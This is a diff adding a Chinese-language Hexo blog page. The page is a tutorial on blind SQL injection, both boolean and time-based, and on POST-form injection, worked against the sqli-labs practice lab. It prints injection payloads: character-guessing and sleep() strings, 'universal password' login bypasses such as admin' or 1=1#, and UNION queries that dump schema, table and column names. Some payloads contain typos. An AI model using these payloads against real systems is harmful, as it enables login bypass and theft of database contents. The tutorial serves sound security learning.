@@ -1,0 +1,215 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>sql注入 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="npmlab,"> 
+    <meta name="description" content="之前我已经分享了sql注入的原理以及显错注入，现在我再来谈谈另外几种注入的形式。
+sql盲注介绍
+何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面，而,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">sql注入</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">sql注入</h1>
+        <div class="stuff">
+            <span>三月 30, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>之前我已经分享了sql注入的原理以及显错注入，现在我再来谈谈另外几种注入的形式。</p>
+<p><strong>sql盲注介绍</strong></p>
+<p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面，而对于攻击者来说也缺少了非常重要的“调试信息”，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<p><em>布尔盲注：</em></p>
+<p>布尔盲注，顾名思义，只有Ture和False，也就是说它只会根据你的注入信息返回Ture跟False，也就是说，不会再显示之前的显错信息了。(我们可以利用逻辑判断进行截取字符串）</p>
+<p><em>时间盲注</em><br>界面返回值只有一种结果ture，无论输出任何值,返回情况都会按ture值来返回正常页面，加入特定的时间函数，通过查看web页面返回时间差来判断注入的语句是否正确。</p>
+<p><em>常用盲注函数</em><br>length（）函数 返回字符串的长度</p>
+<p>substr（）函数 截取字符串</p>
+<p>ascii（） 返回字符串的ascii码</p>
+<p>sleep（n）将程序挂起一段时间，n为n秒</p>
+<p>if（expr1，expr2，expr3）判断语句，如果第一个语句正确就执行第二个，如果错误，就执行第三个语句；</p>
+<p>布尔盲注一般流程：<br>猜解数据库名称长度：</p>
+<p><code>id=1&#39;and(length(database()))&gt;9--+/23%(#)</code></p>
+<p>利用ascii码猜解当前数据库名称：返回正常，说明数据库名称第一位是s</p>
+<p><code>and(ascii(substr(database(),1,1)))=115--+</code></p>
+<p>返回正常，说明数据库名称第二位是e（通过移动第二位数来一位一位的猜出……<br>）</p>
+<p><code>and(ascii(substr(database(),2,1)))=101--+</code></p>
+<p>猜表名：返回正常，说明数据库第一个表名的第一位是e</p>
+<pre><code>and(adcii(substr((select table name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+
+</code></pre><p>猜字段名：返回正常，说明zkaq表中的列名称第一位是f</p>
+<pre><code>and(ascii(substr((select column_name from information_schema.columns where table_name=&apos;zkaq&apos; limit 0,1),1,1)))=102--+
+</code></pre><p>猜内容：返回正常，说明zKaQ列第一位是z</p>
+<pre><code>and（ascii(substr((select zKzQ from zkaq limit 4,1),1,1)))=122--+
+</code></pre><p>具体就是一位一位的猜……其实这样挺麻烦的，可以通过sqlmap进行注入。</p>
+<p>时间盲注<br>主要通过sleep函数进行注入：</p>
+<pre><code>?id=1&apos;and if(ascii(substr(databse(),1,1))=115,sleep(5),1)#
+</code></pre><p>通过if判断执行sql语句，如果条件为真就执行sleep 停5秒再返回，如果为假就执行1即立即返回页面</p>
+<p>##post注入</p>
+<p>post注入的介绍</p>
+<p>post注入也是sql注入的一种类型，通过post进行传参的注入，post传参一般是通过表单的方式提交，但本质上和get注入没有多大的区别。通过伪造插入修改语句，使得用户插入的数据也被当成sql代码去执行。</p>
+<p><em>post注入的高危点</em></p>
+<blockquote>
+<p>网页登陆框</p>
+</blockquote>
+<blockquote>
+<p>网页查询框</p>
+</blockquote>
+<blockquote>
+<p>与数据库有交互的提交框</p>
+</blockquote>
+<p>一般情况下，当我们通过HTML表单提交数据到服务器时，服务端都会在数据库中检查我们输入的数据是否符合要求，然后根据数据库搜索结果返回相应的数据给客户端，但如果我们能控制输入，构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</p>
+<p><strong>先来说一下万能密码：</strong></p>
+<p>1 admin’ or 1 = 1#(后面需要进行注释,–+需要改成#，下面几种都是如此）</p>
+<p>2.admin’ or ‘1’ = ‘1</p>
+<p>3.admin” or “1” = “1</p>
+<p>4.admin”) or (“1”) = (“1</p>
+<p>不过这个也是需要根据情况而定<br>一般第一个比较常用。</p>
+<p>这里以sqli-less-11做post注入例题讲解：</p>
+<p>这时候我第一时间想到的是万能密码，通过尝试，username输入admin’ or 1#</p>
+<p>  <img src="http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/XKxLhntWPPBmqhcGCza4INUvjHyrpqfnQXOZUPZT0nI!/b/dD4BAAAAAAAA&amp;bo=bwKEAQAAAAADB8o!&amp;rf=viewer_4" alt="post1"></p>
+<p>后成功登录，接着是order by查询字段数；</p>
+<p>   <img src="http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/F1n8Cjldbpxb.HdzgAglYTBBkJZ7RzlfVokTWJaLzVE!/b/dLkAAAAAAAAA&amp;bo=cQKQAQAAAAADB8A!&amp;rf=viewer_4" alt="post2"></p>
+<p>然后输入1’ union select 1,2 #，判断出页面有两个显示位：</p>
+<p>   <img src="http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/ZqiUyT.Xh1zockas8dIvuMLLtGvGHA41qh.8MFdlGz4!/b/dLkAAAAAAAAA&amp;bo=agKpAQAAAAADF*I!&amp;rf=viewer_4" alt="post3"></p>
+<p>接下来就是爆数据库名，数据表名，字段名了；</p>
+<p>爆数据库名：<br>    123’ union select 1,group_concat(schema_name) from information_schema.schemata – #</p>
+<p>  <img src="http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/x85fHTJTlCgLANGKNplCyLHCdLMxEFNKc4JAkgghSRU!/b/dL8AAAAAAAAA&amp;bo=2wK0AQAAAAADF14!&amp;rf=viewer_4" alt="post4"> </p>
+<p>爆数据表名：<br>    123’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() –  #</p>
+<p>   <img src="http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/1P*1GdLfwYS.dx7tj0SOY9PmSnOfVS7HUHLE2pU68.E!/b/dL8AAAAAAAAA&amp;bo=XwShAQAAAAADF8k!&amp;rf=viewer_4" alt="post5"></p>
+<p>爆字段名：<br>    123’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ – #</p>
+<pre><code>![post6](http://m.qpic.cn/psb?/V11XTq8q0TMSFZ/oC4de4kaa0e4tc9OJAenDzaVODK9kikdxT*AjfqEZTQ!/b/dL8AAAAAAAAA&amp;bo=kgKcAQAAAAADFz8!&amp;rf=viewer_4)
+</code></pre><p>（ps:密码随便填什么都没关系）</p>
+<p>其实注入的内容与前面的差不多，都是将sql的语句拼接起来，从而爆出自己所需要的内容。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci data-cs data-r data-o data-a="npmlab" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
